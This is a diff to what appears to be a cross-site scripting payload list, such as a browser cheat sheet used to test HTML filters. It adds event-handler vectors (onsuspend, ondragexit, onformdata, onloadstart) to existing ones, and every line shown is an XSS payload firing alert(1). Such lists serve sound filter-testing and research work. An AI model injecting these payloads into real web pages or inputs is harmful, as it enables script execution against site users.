@@ -83,6 +83,8 @@
 <a href=\"javascript:x='&percnt;27-alert(1)-%27';\">XSS<\/a>
 <div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>
 <style>:target {color:red;}<\/style><* id=x style=\"transition:color 1s\" ontransitionstart=alert(1)><\/*>
+<video controls onsuspend=alert(1)><source src=validvideo.mp4 type=video/mp4></video>
+<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
 <video controls onprogress=alert(1)><source src=validvideo.mp4 type=video/mp4></video>
 <audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
 <video controls ondurationchange=alert(1)><source src=validvideo.mp4 type=video/mp4></video>
@@ -401,6 +403,7 @@ code
 <* oncut=alert(1) value=\"XSS\" autofocus tabindex=1 style=display:block>test
 <* ondblclick=\"alert(1)\" autofocus tabindex=1 style=display:block>test<\/*>
 <* draggable=\"true\" ondrag=\"alert(1)\" style=display:block>test<\/*>
+<* draggable=\"true\" ondragexit=\"alert(1)\" style=display:block>test<\/*>
 <* draggable=\"true\" ondragend=\"alert(1)\" style=display:block>test<\/*>
 <* draggable=\"true\" ondragenter=\"alert(1)\" style=display:block>test<\/*>
 <* draggable=\"true\" ondragleave=\"alert(1)\" style=display:block>test<\/*>
@@ -724,6 +727,7 @@ code
 <xss autofocus tabindex=1 onfocusin=alert(1)><\/xss>
 <* onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</*><input value=clickme>
 <body onhashchange=\"print()\">
+<form onformdata=\"alert(1)\"><button>Click</button></form>
 <input oninput=alert(1) value=xss>
 <textarea oninput=alert(1)>XSS<\/textarea>
 <form><input oninvalid=alert(1) required><input type=submit>
@@ -731,6 +735,7 @@ code
 <* onkeydown=\"alert(1)\" contenteditable style=display:block>test<\/*>
 <* onkeypress=\"alert(1)\" contenteditable style=display:block>test<\/*>
 <* onkeyup=\"alert(1)\" contenteditable style=display:block>test<\/*>
+<video onloadstart=\"alert(1)\"><source><\/*>
 <body onload=alert(1)>
 <script onload=alert(1) src=validjs.js><\/script>
 <object data=\/ onload=alert(1)>
